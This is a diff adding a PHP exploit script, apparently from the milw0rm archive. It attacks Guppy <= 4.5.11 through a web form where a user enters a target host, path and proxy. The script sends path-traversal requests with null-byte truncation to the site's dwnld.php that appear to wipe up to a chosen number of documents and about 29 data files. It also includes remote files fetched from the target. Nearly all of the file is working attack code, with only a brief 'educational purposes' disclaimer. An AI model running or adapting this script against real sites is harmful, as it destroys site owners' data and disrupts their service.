@@ -1,0 +1,232 @@
+# Change line 30 s/htp/http if you would like to see the logo. /str0ke
+
+<?php
+#                    Guppy <= 4.5.11 Remote DOS Exploit                       #
+#                               by trueend5                                   #
+#             Computer Security Science Researchers Institute                 #
+#                           [http://www.KAPDA.ir]                             #
+#                                                                             #
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout", 5);
+ob_implicit_flush (1);
+
+echo'<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Guppy &lt;= 4.5.11 Remote DOS Exploit</title>
+</head>
+
+<body bgcolor="#FFCCFF">
+
+<p align="center"><font size="4" color="#0000FF">Guppy &lt;= 4.5.11 Remote DOS
+Exploit</font></p>
+<p class="Stile6" align="center"><font size="3" color="#FF0000">by trueend5</font></p>
+<p align="center"><font size="4" color="#008000">Computer Security Science Researchers
+Institute</font></p>
+<font SIZE="3">
+<p align="center"><a href="http://www.kapda.ir">KAPDA</a></p>
+<p align="center"><img border="0" src="http://irannetjob.com/pics/ph-logo.png" width="120" height="121"></p>
+</font>
+<table width="90%">
+  <tbody>
+    <tr>
+      <td width="43%" align="left">
+        <form name="form1" action="'.$SERVER[PHP_SELF].'" method="post">
+          <p><input name="host" size="20"> <span class="Stile5"><font color="#FF0000">*</font> hostname (ex:www.sitename.com)</span></p>
+          <p><input name="path" size="20"> <span class="Stile5"><font color="#FF0000">*</font> path (ex:
+          /guppy/
+          or just / )</span></p>
+          <p><input name="num" size="20"> <span class="Stile5">how many document
+          do you want to destroy (default is 100)</span></p>
+          <p>&nbsp; This option works when magic_quotes_gpc is Off</p>
+          <p><input name="port" size="20"><span class="Stile5">specify a port&nbsp;
+          (default is 80)</span></p>
+          <p><input name="proxy" size="20"><span class="Stile5">send exploit
+          through an HTTP proxy (ip:port)</span></p>
+          <p align="center"> <span class="Stile5"><font color="#FF0000">&nbsp;&nbsp;
+          * </font>fields are required</span></p>
+          <p align="center"><span class="Stile5">-----------------------------------------------------------------------------------------------</span></p>
+          
+          <p><input type="submit" value="Start" name="Submit"></p>
+        </form>
+      </td>
+    </tr>
+  </tbody>
+</table>
+</body></html>';
+function show($headeri)
+{
+  $ii=0;$ji=0;$ki=0;$ci=0;
+  echo '<table border="0"><tr>';
+  while ($ii <= strlen($headeri)-1){
+    $datai=dechex(ord($headeri[$ii]));
+    if ($ji==16) {
+      $ji=0;
+      $ci++;
+      echo "<td>&nbsp;&nbsp;</td>";
+      for ($li=0; $li<=15; $li++) {
+        echo "<td>".$headeri[$li+$ki]."</td>";
+		}
+      $ki=$ki+16;
+      echo "</tr><tr>";
+    }
+    if (strlen($datai)==1) {
+      echo "<td>0".$datai."</td>";
+    }
+    else {
+      echo "<td>".$datai."</td> ";
+    }
+    $ii++;$ji++;
+  }
+  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {
+    echo "<td>&nbsp&nbsp</td>";
+  }
+  for ($li=$ci*16; $li<=strlen($headeri); $li++) {
+    echo "<td>".$headeri[$li]."</td>";
+  }
+  echo "</tr></table>";
+}
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacket() 
+{
+  global $proxy, $host, $port, $packet, $html, $proxy_regex;
+  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+  if ($socket < 0) {
+    echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
+  }
+  else {
+    $c = preg_match($proxy_regex,$proxy);
+    if (!$c) {echo 'Not a valid proxy';
+    die;
+    }
+  echo "OK.<br>";
+  echo "Attempting to connect to ".$host." on port ".$port."...<br>";
+  if ($proxy=='') {
+    $result = socket_connect($socket, $host, $port);
+  }
+  else {
+    $parts =explode(':',$proxy);
+    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+    $result = socket_connect($socket, $parts[0],$parts[1]);
+  }
+  if ($result < 0) {
+    echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
+  }
+  else {
+    echo "OK.<br><br>";
+    $html= '';
+    socket_write($socket, $packet, strlen($packet));
+    echo "Reading response:<br>";
+    while ($out= socket_read($socket, 2048)) {$html.=$out;}
+    echo nl2br(htmlentities($html));
+    echo "Closing socket...";
+    socket_close($socket);
+  }
+  }
+}
+
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.htmlentities($host); die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy';die;
+    }
+    $parts=explode(':',$proxy);
+    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+$host=$_POST[host];
+$path=$_POST[path];
+$port=$_POST[port];
+$num=$_POST[num];
+
+if (($host<>'') and ($path<>''))
+{
+  $port=intval(trim($port));
+  $num=intval(trim($num));
+  if ($port=='') {$port=80;}
+  if ($num=='') {$num=100;}
+  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die('Error... check the path!');}
+  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+  $host=str_replace("\r\n","",$host);
+  $path=str_replace("\r\n","",$path);
+  echo ' Try to see if magic_quotes_gpc is enable! ...';
+  $packet="GET ".$p."mobile/dwnld.php?pg=./%2E./test.inc%00"." HTTP/1.1\r\n";
+  $packet.="User-Agent: Shareaza v1.x.x.xx\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  show($packet);
+  sendpacketii($packet);
+  $test='http://'.$host.$path.'data/test.inc';
+  if (!include("$test")) {
+  echo'It seems magic_quotes_gpc is On. Trying STEP 2 ...';
+}
+  else {echo'magic_quotes_gpc is disable. STEP 1:';
+  for ($n = 1; $n <= $num; $n++) {
+  $packet="GET ".$p."mobile/dwnld.php?pg=./%2E./doc".$n.".inc%00"." HTTP/1.1\r\n";
+  $packet.="User-Agent: Shareaza v1.x.x.xx\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  show($packet);
+  sendpacketii($packet);
+  }
+}
+  echo' STEP 2:';
+  for ($n = 1; $n <= 29; $n++) {
+  if ($n==1) {$str='ar';} if ($n==2) {$str='counter';} if ($n==3) {$str='dn';} if ($n==4) {$str='docid';} if ($n==5) {$str='fa';}
+  if ($n==6) {$str='fr';} if ($n==7) {$str='frcat';} if ($n==8) {$str='frcount';} if ($n==9) {$str='frth';} if ($n==10) {$str='ippoll';}
+  if ($n==11) {$str='ipstats';} if ($n==12) {$str='li';} if ($n==13) {$str='log_date';} if ($n==14) {$str='log_files';}
+  if ($n==15) {$str='log_stats';} if ($n==16) {$str='logbook';} if ($n==17) {$str='logd';} if ($n==18) {$str='logh';}
+  if ($n==19) {$str='logm';} if ($n==20) {$str='logp';} if ($n==21) {$str='logy';} if ($n==22) {$str='nextid';}
+  if ($n==23) {$str='nwlist';} if ($n==24) {$str='ph';} if ($n==25) {$str='poll';} if ($n==26) {$str='ra';}
+  if ($n==27) {$str='rs';} if ($n==28) {$str='stats';} if ($n==29) {$str='statsbk';}
+  $packet="GET ".$p."mobile/dwnld.php?pg=./%2E./$str"." HTTP/1.1\r\n";
+  $packet.="User-Agent: SnoopRob/x.x\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  show($packet);
+  sendpacketii($packet);
+  }
+  $test2='http://'.$host.$path.'data/stats.dtb';
+  include("$test2");
+  if (eregi("1",$html)) {echo "Exploit succeeded"; }
+                           else {echo "Exploit failed...";}
+}
+else
+{echo "IMPORTANT NOTICE: This POC is just for educational purposes, Please Do not use it against external websites<br>
+You are responsible for any damage that .... ";}
+
+?>
+
+# milw0rm.com [2006-03-10]
